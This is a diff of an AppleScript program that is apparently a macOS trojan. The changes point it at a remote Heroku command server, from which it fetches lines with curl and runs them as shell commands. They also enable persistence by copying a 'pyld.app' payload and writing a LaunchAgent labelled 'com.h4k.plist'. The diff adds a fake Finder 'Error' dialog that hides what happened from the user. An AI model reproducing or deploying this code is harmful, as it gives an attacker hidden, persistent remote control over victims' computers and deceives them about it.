@@ -21,8 +21,8 @@
 
 *)
 
---set remoteHost to "http://damp-journey-2734.herokuapp.com"
-set remoteHost to "http://localhost:5000"
+set remoteHost to "http://damp-journey-2734.herokuapp.com"
+--set remoteHost to "http://localhost:5000"
 set commandURL to remoteHost & "/remote.txt"
 try
 	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
@@ -36,7 +36,7 @@ try
 	else
 		if (count of commandArgs) > 2 then
 			repeat with a from 3 to (count of commandArgs)
-				if (item a of commandArgs) starts with "C-" or (item a of commandArgs) starts with "A-"
+				if (item a of commandArgs) starts with "C-" or (item a of commandArgs) starts with "A-" then
 					try
 						do shell script (characters 3 thru -1 of (item a of commandArgs) as string) -- Run commands
 					end try
@@ -58,10 +58,9 @@ try
 on error
 	return
 end try
-(*
 try
-	set reso to quoted form of POSIX path of (path to resource "Updater.app")
-	set newreso to POSIX path of ("" & ufld & "Updater.app")
+	set reso to quoted form of POSIX path of (path to me) & "Contents/Resources/pyld.app"
+	set newreso to POSIX path of ("" & ufld & "pyld.app")
 	do shell script "cp -r " & reso & " " & newreso -- Copy duplicate app
 	
 	try
@@ -71,8 +70,10 @@ try
 	do shell script "touch " & plistPath -- Make a launchagent for startup
 	log "new"
 	do shell script "defaults write " & plistPath & " Label 'com.h4k.plist'"
-	do shell script "defaults write " & plistPath & " Program '" & ufld & "Updater.app/Contents/MacOS/applet'"
+	do shell script "defaults write " & plistPath & " Program '" & ufld & "pyld.app/Contents/MacOS/applet'"
 	do shell script "defaults write " & plistPath & " RunAtLoad -bool true"
-	do shell script "launchctl load "
 end try
-*)
+try
+	display dialog "The process could not be completed.
+	" with title "Error" with icon ((path to me) & "Contents:Resources:Finder.icns" as text) as alias buttons ["OK"] default button 1
+end try
